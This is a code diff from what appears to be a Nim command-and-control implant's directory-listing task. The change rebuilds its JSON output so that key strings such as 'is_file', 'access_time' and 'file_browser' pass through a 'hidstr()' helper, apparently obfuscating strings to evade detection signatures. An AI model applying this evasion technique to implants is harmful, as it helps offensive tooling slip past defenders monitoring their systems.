@@ -31,34 +31,35 @@ proc lsExecute(taskId: string, params: JsonNode, state: AgentState,
       else:
         perms = if isFile: "rw-r--r--" else: "rwxr-xr-x"
 
-      files.add(%*{
-        "is_file":     isFile,
-        "permissions": {"permissions": perms},
-        "name":        lastPathPart(entry),
-        "access_time": info.lastAccessTime.toUnix(),
-        "modify_time": info.lastWriteTime.toUnix(),
-        "size":        if isFile: info.size else: 0,
-      })
+      var fileObj = newJObject()
+      fileObj[hidstr("is_file")]     = %isFile
+      fileObj["permissions"]          = %*{"permissions": perms}
+      fileObj["name"]                 = %lastPathPart(entry)
+      fileObj[hidstr("access_time")] = %info.lastAccessTime.toUnix()
+      fileObj["modify_time"]          = %info.lastWriteTime.toUnix()
+      fileObj["size"]                 = %(if isFile: info.size else: 0)
+      files.add(fileObj)
 
-    let fileBrowser = %*{
-      "host":           getHostname(),
-      "is_file":        false,
-      "permissions":    newJObject(),
-      "name":           lastPathPart(fullPath),
-      "parent_path":    parentDir(fullPath),
-      "success":        true,
-      "access_time":    dirInfo.lastAccessTime.toUnix(),
-      "modify_time":    dirInfo.lastWriteTime.toUnix(),
-      "size":           0,
-      "update_deleted": true,
-      "files":          files,
-    }
+    var fileBrowser = newJObject()
+    fileBrowser["host"]                = %getHostname()
+    fileBrowser[hidstr("is_file")]     = %false
+    fileBrowser["permissions"]         = newJObject()
+    fileBrowser["name"]                = %lastPathPart(fullPath)
+    fileBrowser["parent_path"]         = %parentDir(fullPath)
+    fileBrowser["success"]             = %true
+    fileBrowser[hidstr("access_time")] = %dirInfo.lastAccessTime.toUnix()
+    fileBrowser["modify_time"]         = %dirInfo.lastWriteTime.toUnix()
+    fileBrowser["size"]                = %0
+    fileBrowser["update_deleted"]      = %true
+    fileBrowser["files"]               = files
 
+    var fbWrapper = newJObject()
+    fbWrapper[hidstr("file_browser")] = fileBrowser
     return TaskResult(
-      output:      $(%*{"file_browser": fileBrowser}),
+      output:      $fbWrapper,
       status:      "success",
       completed:   true,
-      extraFields: %*{"file_browser": fileBrowser},
+      extraFields: fbWrapper,
     )
   except Exception as e:
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
